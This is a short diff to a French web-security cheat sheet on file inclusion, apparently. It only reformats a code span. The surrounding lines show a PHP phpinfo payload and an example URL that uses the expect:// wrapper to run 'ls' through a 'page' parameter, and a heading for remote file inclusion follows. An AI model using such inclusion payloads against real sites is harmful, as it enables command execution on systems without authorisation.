@@ -121,7 +121,7 @@ La payload est <?php phpinfo(); ?>
 
 **Wrapper expect://**
 
-```https://fhbapt.github.io/?page=expect://ls```
+`https://fhbapt.github.io/?page=expect://ls`
 
 ### RFI (Remote File Inclusion) <a name="rfi"></a>
 
